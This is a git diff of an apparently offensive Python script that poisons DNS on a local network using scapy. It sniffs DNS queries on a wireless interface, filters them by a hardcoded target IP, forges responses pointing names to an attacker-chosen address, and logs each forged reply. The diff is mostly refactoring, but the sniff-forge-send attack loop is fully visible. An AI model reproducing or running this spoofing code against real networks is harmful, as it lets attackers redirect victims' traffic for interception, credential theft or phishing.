@@ -29,7 +29,7 @@ def forge_packet(packet_to_forge, ip):
     return forged_packet
 
 
-def packet_handler(packet_to_process, target):
+def dns_packet_handler(packet_to_process, target):
     if packet_to_process.haslayer(DNS) and packet_to_process[DNS].qr == 0:
         # print(packet_to_process[DNS].qd.qname.decode('UTF-8'))
         # print(packet_to_process[IP].src)
@@ -40,7 +40,8 @@ def packet_handler(packet_to_process, target):
             if target is None or packet_to_process[IP].src == target:
                 forged_packet = forge_packet(packet_to_process, ip)
                 send(forged_packet, verbose=0)
-                print(f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
+                print(
+                    f"[*] Forged DNS response sent. Told {packet_to_process[IP].src} that {packet_to_process[DNS].qd.qname.decode('UTF-8')} was at {ip}")
 
 
 def start_dns_poisoning(interface_to_listen, target, printing_queue, verbosity):
@@ -51,17 +52,13 @@ def start_dns_poisoning(interface_to_listen, target, printing_queue, verbosity):
     return cancel_token
 
 
-
 def dns_poisoning_loop(interface_to_listen, target, printing_queue, verbosity, cancel_token):
     while not cancel_token.is_set():
-        sniff(iface=interface_to_listen, prn=lambda pkt: packet_handler(pkt, target), store=0, count=1)
-
-
+        sniff(iface=interface_to_listen, prn=lambda pkt: dns_packet_handler(pkt, target), store=0, count=1)
 
 
 if __name__ == "__main__":
-        dns_thread_token = start_dns_poisoning("wlan0", "192.168.2.100", 0,1)
-        # time.sleep(5)
-        # print("stopping")
-        # dns_thread_token.set()
-
+    dns_thread_token = start_dns_poisoning("wlan0", "192.168.2.100", 0, 1)
+    # time.sleep(5)
+    # print("stopping")
+    # dns_thread_token.set()
